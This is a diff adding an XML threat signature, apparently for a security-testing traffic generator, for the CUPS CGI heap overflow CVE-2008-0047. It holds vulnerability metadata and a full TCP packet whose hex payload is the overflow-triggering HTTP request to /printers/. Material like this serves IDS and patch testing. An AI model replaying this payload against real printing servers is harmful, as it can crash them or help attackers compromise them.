@@ -1,0 +1,72 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Multiple Vendor CUPS Administration Interface CGI Heap Overflow"/>
+    <EngDesc display="true" value="A heap buffer overflow vulnerability exists in Apple's Common Unix Printing System (CUPS) distributed by multiple vendors. The vulnerability is due to a boundary error in handling of incoming CGI requests and may be exploited by remote attackers to compromise a vulnerable system or cause denial of service. In an attack case where code injection is not successful, the affected CGI application will terminate abnormally. In a more sophisticated attack case where code injection is successful, the behaviour of the target is entirely dependent on the intended function of the injected code. The code in such a case would execute within the security context of the affected service, with the privileges of the printer user, normally lp."/>
+    <Intent display="true">
+      <item value="Code_Execution/Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Apple&amp;Caldera&amp;Debian&amp;RedHat&amp;S.u.S.E.&amp;Ubuntu"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Multiple_Vendor_CUPS"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Apple_CUPS_1.3.5_and_prior/Apple_Mac_OS_X_10.5.2_and_prior/Apple_Mac_OS_X_Server_10.5.2_and_prior/Caldera_OpenLinux_Server_3.1.1_and_prior/Caldera_OpenLinux_Workstation_3.1.1_and_prior/Debian_Debian_Linux_4.0_and_prior/RedHat_Enterprise_Linux_AS_3&amp;Desktop_5&amp;ES_3&amp;ES_4&amp;WS_3&amp;WS_4&amp;5_Server/RedHat_Desktop_3.0&amp;4.0/S.u.S.E._openSUSE_10.3_and_prior/Ubuntu_Ubuntu_Linux_7.10_and_prior"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2008-0047"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="c055fec6d67d5e2cab726a904eee4d5d"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634006366424659996"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1265020205" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="O"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="P"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="O"/>
+      <for index="P"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="00:07:E9:0A:07:E5" destMac="00:0C:29:24:7B:28" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="019B" Identification="3144" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="A5FE" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="54883" destPort="$HTTPdestPort" SeqNumber="20C0F0AD" AckNumber="67ECE11C" HeaderLength="08" WindowSize="05B4" Checksum="B27C" UrgentPointer="0000" Options="0101080AD339C1ED0021FD7D" Payload="474554202F7072696E746572732F3F51554552593D2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E253230414E442532302E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E2E20485454502F312E310D0A486F73743A20746573742E636F6D0D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
